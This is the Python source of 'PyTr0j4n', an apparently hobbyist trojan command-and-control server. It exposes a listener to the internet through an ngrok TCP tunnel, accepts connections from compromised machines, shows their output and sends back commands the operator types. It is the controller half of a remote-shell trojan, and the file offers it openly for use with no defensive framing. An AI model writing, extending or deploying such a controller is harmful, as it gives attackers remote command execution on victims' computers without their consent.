import socket
from pyngrok import ngrok
import threading
import colorama
import banners
import time
colorama.init()    

COLOR_RED = colorama.Fore.RED
COLOR_GREEN = colorama.Fore.GREEN
COLOR_YELLOW = colorama.Fore.YELLOW
COLOR_BLUE = colorama.Fore.BLUE
COLOR_RESET = colorama.Style.RESET_ALL



class PyTr0j4n:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.server = None
        self.serverAdress = (self.host, self.port)

    def createNgrokTunnel(self, port):
        try:
            self.public_url = ngrok.connect(port, "tcp")
            print(f"{COLOR_GREEN}[*] Ngrok tunnel created: {self.public_url.public_url}")
        except Exception as e:
            print(f"{COLOR_RED} Error creating ngrok tunnel: {e}")
            return None

    def startServer(self):
        try:
            self.createNgrokTunnel(self.port)
            if not self.public_url:
                print(f"{COLOR_RED} [!] Unable to create ngrok tunnel. Exiting.")
                return

            print(f"{COLOR_GREEN}[*] Listening on {self.public_url.public_url}")

            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.bind((self.host, self.port))
            self.server.listen(5)
            print(f"{COLOR_GREEN}[*] Listening on {self.host}:{self.port}")
            self.acceptConnections()
        except Exception as e:
            print(f"{COLOR_RED}[*] Error starting the server: {e}")


    def handleClient(self, client_socket, client_address):
        try:
            print(f"{COLOR_GREEN}[*] Accepted connection from {client_address[0]}:{client_address[1]}\n")
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                print(f"{COLOR_RESET}{data.decode('utf-8')}")
                response = input(f"{COLOR_YELLOW}\nEnter command (or '/exit' to quit): \n")
                if(response.lower() == "exit"):
                    self.stopServer()
                client_socket.sendall(response.encode('utf-8'))
        except Exception as e:
            print(f"{COLOR_RED} Error handling client: {e}")
        finally:
            client_socket.close()

    def acceptConnections(self):
        try:
            while True:
                client_socket, client_address = self.server.accept()
                client_handler = threading.Thread(target=self.handleClient, args=(client_socket, client_address))
                client_handler.start()
        except KeyboardInterrupt:
            print("{COLOR_YEALLOW}[*] Server is shutting down.")
            time.sleep(2)
            self.server.close()
    def stopServer(self):
        print(f"{COLOR_YELLOW}[*] Stopping server...")
        time.sleep(2)
        self.server.close()

def main():
    host = '0.0.0.0'  # Listen on all available interfaces
    port = 8888

    server = PyTr0j4n(host, port)
    server.startServer()

if __name__ == "__main__":
    print(COLOR_BLUE + banners.getBanner())
    print(f"\t{COLOR_BLUE}Author: {COLOR_RESET}Kayan Tchian | {COLOR_BLUE}GitHub: {COLOR_RESET}kayantchian\n")
    print(f"{COLOR_GREEN}[*] Welcome to PyTr0j4n")
    print(f"{COLOR_BLUE}[++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\n\n")
    time.sleep(3)
    main()
